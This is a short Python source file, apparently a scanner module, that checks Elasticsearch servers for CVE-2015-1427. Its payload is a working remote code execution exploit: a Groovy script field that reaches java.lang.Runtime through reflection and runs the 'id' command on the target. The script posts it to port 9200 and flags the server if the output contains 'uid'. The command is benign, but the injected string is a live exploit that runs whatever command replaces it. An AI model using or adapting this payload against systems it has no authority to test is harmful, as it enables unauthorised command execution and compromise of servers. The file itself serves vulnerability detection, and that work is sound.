"""
@Author: exiashow
@File: es_code_execute.py
@Date: 2024/2/26 16:30
@Desc: CVE-2015-1427, elastic code executing
@Summary:
"""

import requests
import sys


class CVE20151427(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = r'''
                 {"size":1, 
                 "script_fields": 
                 {"lupin":
                 {"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}
                 }
                 }
                 '''

        path = ":9200/_search?pretty"

        try:
            conn = requests.post(self.url + path, data=payload, timeout=5)
            if "uid" in conn.text:
                return "[Warning] Elasticsearch vulnerability discovered: CVE-2015-1427"
            else:
                return None
        except requests.exceptions.ConnectionError:
            pass


if __name__ == "__main__":
    fallingSword = CVE20151427(sys.argv[1])
    fallingSword.run()
